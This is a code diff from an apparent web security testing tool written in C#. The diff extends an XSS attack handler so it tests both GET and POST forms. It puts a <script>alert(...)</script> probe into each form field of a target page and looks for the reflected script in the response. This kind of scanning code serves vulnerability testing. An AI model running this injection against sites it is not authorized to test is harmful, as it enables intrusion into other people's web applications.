@@ -8,7 +8,7 @@ using Hacking_REST_Services.Helpers;
 
 namespace Hacking_Rest_SqlInjetor.ServiceHandlers.AttackHandlers
 {
-    internal class XssAttackGetMethodInputs : AbstractServiceHandler
+    internal class XSS_Attack_Inputs : AbstractServiceHandler
     {
         public override void StartAttack(string targetUri, ICustomHttpClient client)
         {
@@ -19,7 +19,7 @@ namespace Hacking_Rest_SqlInjetor.ServiceHandlers.AttackHandlers
 
             foreach(var form in formsOfHtmlDocument)
             {
-                if (form.Method != "GET")
+                if (form.Method != "GET" && form.Method != "POST")
                 {
                     continue;
                 }
@@ -28,9 +28,10 @@ namespace Hacking_Rest_SqlInjetor.ServiceHandlers.AttackHandlers
                 foreach(var request in requests)
                 {
                     request.BuildRequest();
-                    var performGetInjection = client.Get(request);
-                    string injectionResponse = CustomHttpClient.GetResponseContent(performGetInjection);
-                    
+                    //Console.WriteLine(request.Content.ReadAsStringAsync().Result);
+
+                    var performGetInjection = request.Method == HttpMethod.Get ? client.Get(request) : client.Post(request);
+                    string injectionResponse = CustomHttpClient.GetResponseContent(performGetInjection);                   
                     const string scriptRegex = @"<script>alert\('X(.*?)SS'\)</script>";
                     const RegexOptions options = RegexOptions.IgnoreCase | RegexOptions.Singleline;
                     var match = Regex.Match(injectionResponse, scriptRegex, options);
@@ -48,14 +49,18 @@ namespace Hacking_Rest_SqlInjetor.ServiceHandlers.AttackHandlers
             var returnList = new List<HttpContext>();
             foreach (var input in form.InputFields)
             {
-                var context = new HttpContext(HttpMethod.Get, targetUri);
+                var context = new HttpContext(form.Method == "GET" ? HttpMethod.Get : HttpMethod.Post, targetUri);
                 foreach (var inputField in form.InputFields)
                 {
                     context.AddField(inputField.Name, inputField.Value ?? "test");
                 }
-                context.AddField(input.Name, $"<script>alert('X{input.Name}SS')</script>");
+                context.AddField(input.Name, $"<script>alert('X{input.Name}SS')</script>");              
+                foreach (var item in form.SelectFields)
+                {
+                    context.AddField(item.Name, item.OptionValues[0].Length > 0 ? item.OptionValues[0] : null);
+                }
                 returnList.Add(context);
-            }
+            }         
             return returnList;                    
         }       
     }
